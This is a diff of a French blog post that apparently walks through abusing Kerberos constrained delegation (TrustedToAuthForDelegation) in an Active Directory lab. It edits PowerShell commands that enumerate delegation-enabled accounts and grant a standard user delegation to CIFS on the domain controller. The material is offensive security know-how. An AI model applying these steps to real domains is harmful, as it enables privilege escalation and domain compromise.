@@ -26,6 +26,8 @@ Il y a deux méthodes pour bénéficier des cmdlets ActiveDirectory:
   
 ## TrustedToAuthForDelegation
 
+```srv$``` est un compte machine du domaine.  
+
 ```powershell
 Get-ADComputer -Identity srv | Set-ADAccountControl -TrustedToAuthForDelegation $True
 Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.WINDOMAIN.LOCAL','TIME/DC')}
@@ -35,21 +37,23 @@ ou via GUI:
   
 ![t2a4d]({{ site.url }}/public/images/t2a4d/setup_t2a4d.png)
   
-Notons que la délégation contrainte peut également être basée sur la ressource (écriture de la propriété **msds-allowedtoactonbehalfofotheridentity** de ```MACHINE$```). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut lui accéder.  
-
+Notons que la délégation contrainte peut également être basée sur la ressource (écriture de la propriété **msds-allowedtoactonbehalfofotheridentity**). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut lui accéder. Nous reviendrons la dessus par la suite.  
+  
 Rentrons dans le vif du sujet.  
-
+  
 # Enumeration
 
 La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
 ```powershell
-PS C:\tools> Get-ADObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+PS C:\tools> Get-ADObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl
 
 
-samaccounttype           : MACHINE_ACCOUNT
-distinguishedname        : CN=SRV,CN=Computers,DC=windomain,DC=local
-useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION
+useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+serviceprincipalname     : {RestrictedKrbHost/SRV, RestrictedKrbHost/SRV.windomain.local, WSMAN/SRV, WSMAN/SRV.windomain.local...}
 msds-allowedtodelegateto : {TIME/DC, TIME/DC.WINDOMAIN.LOCAL}
+distinguishedname        : CN=SRV,CN=Computers,DC=windomain,DC=local
+samaccountname           : SRV$
+samaccounttype           : MACHINE_ACCOUNT
 ```
 
 L'outil [Invoke-Recon](https://github.com/phackt/Invoke-Recon) trouvera tout cela pour vous.  
@@ -353,7 +357,7 @@ PS C:\> net user bleponge /domain | Select-String "Group"
 Local Group Memberships
 Global Group memberships     *Domain Users
 
-PS C:\> Get-ADObject -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo,serviceprincipalname | fl
+PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl
 
 
 useraccountcontrol : NORMAL_ACCOUNT
@@ -366,7 +370,7 @@ samaccounttype     : USER_OBJECT
 PS C:\> Get-ADUser -Identity bleponge | Set-ADAccountControl -TrustedToAuthForDelegation $True
 PS C:\> Set-ADUSer -Identity bleponge -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC.WINDOMAIN.LOCAL','CIFS/DC')}
 PS C:\> Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
-PS C:\> Get-ADObject -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo,serviceprincipalname | fl
+PS C:\> Get-ADObject -Identity bleponge -Properties distinguishedName,samAccountName,samAccountType,userAccountControl,msDS-AllowedToDelegateTo,servicePrincipalName | fl
 
 
 useraccountcontrol       : NORMAL_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
